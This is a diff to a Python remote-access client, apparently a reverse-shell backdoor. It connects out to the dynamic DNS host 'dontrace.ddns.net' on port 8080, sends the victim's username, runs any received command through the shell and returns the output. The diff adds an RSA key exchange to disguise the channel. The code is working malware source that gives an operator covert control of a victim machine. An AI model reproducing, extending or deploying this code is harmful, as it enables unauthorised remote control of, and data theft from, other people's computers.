@@ -1,3 +1,4 @@
+#!/usr/bin/env python
 
 
 import socket 
@@ -7,6 +8,11 @@ import webbrowser
 import platform
 import ctypes
 import hashlib
+import Crypto
+from Crypto.PublicKey import RSA
+from Crypto.Cipher import AES
+
+
 
 def transfer(s,command,username):
     x1,src,dst=map(str,command.split(' '))
@@ -70,12 +76,31 @@ def connect():
     #start the client, configure your router/firewall to redirect traffic for port 8080 to your internal server and that should be it
     
     rmdomain='dontrace.ddns.net'
+    
     rhost=socket.gethostbyname(rmdomain)
-    s.connect((rhost, 8080))
+    s.connect((rhost,8080)) 
+    
     os=str(platform.system())
+
     CMD =  subprocess.Popen('whoami', shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
     username=str(CMD.stdout.read().split('\\')[-1])
     s.send(username)
+
+    private_key = RSA.generate(1024)
+
+    public_key = private_key.publickey()
+
+    send_public=public_key.exportKey()
+
+    s.send(send_public)
+
+    secret_enc=s.recv(1024)
+
+    secret=private_key.decrypt(secret_enc)
+
+    s.send(secret)
+
+
     while True: 
         command=s.recv(1024)
         if 'terminate' in command:
@@ -91,8 +116,8 @@ def connect():
             change_desktop_bg(s,command)
         else:
             CMD =  subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
-            s.send( CMD.stdout.read()  ) 
-            s.send( CMD.stderr.read()  ) 
+            s.send( CMD.stdout.read())
+            s.send( CMD.stderr.read())
 
 def main ():
     connect()
